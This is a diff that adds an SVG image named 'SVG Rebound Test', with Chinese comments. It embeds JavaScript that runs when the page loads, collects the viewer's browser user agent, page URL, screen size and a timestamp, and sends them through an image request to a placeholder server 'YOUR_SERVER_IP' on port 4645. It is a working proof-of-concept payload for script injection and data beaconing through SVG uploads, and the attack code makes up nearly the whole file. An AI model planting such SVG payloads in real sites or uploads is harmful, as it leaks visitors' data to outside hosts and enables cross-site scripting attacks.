@@ -1,0 +1,47 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg width="200" height="100" version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <!-- 简单图形显示（可选，不影响功能） -->
+  <rect width="200" height="100" fill="#f0f0f0" stroke="#333" stroke-width="2"/>
+  <text x="100" y="50" font-family="Arial" font-size="14" text-anchor="middle" fill="#333">
+    SVG Rebound Test
+  </text>
+
+  <!-- 核心反弹脚本（必须修改YOUR_SERVER_IP） -->
+  <script type="text/javascript"><![CDATA[
+    // 配置区域 - 请修改为你的服务器IP或域名
+    const SERVER_IP = "YOUR_SERVER_IP";  // 例如: "192.168.1.100" 或 "yourdomain.com"
+    const PORT = 4645;
+    
+    // 收集客户端信息（可扩展）
+    const clientInfo = {
+      userAgent: navigator.userAgent,
+      location: window.location.href,
+      screen: `${screen.width}x${screen.height}`,
+      timestamp: new Date().toISOString()
+    };
+    
+    // 发送反弹请求
+    function sendRebound() {
+      try {
+        // 创建请求URL（包含客户端信息）
+        const query = new URLSearchParams(clientInfo).toString();
+        const url = `http://${SERVER_IP}:${PORT}/rebound?${query}`;
+        
+        // 使用Image对象发送GET请求（无跨域限制）
+        const img = new Image();
+        img.src = url;
+        
+        // 成功提示
+        alert("✅ SVG已加载！数据已反弹到服务器");
+        console.log("反弹请求已发送:", url);
+      } catch (error) {
+        console.error("反弹请求失败:", error);
+        alert("❌ 反弹请求失败，请检查服务器配置");
+      }
+    }
+    
+    // 页面加载时执行
+    window.onload = sendRebound;
+  ]]></script>
+</svg>
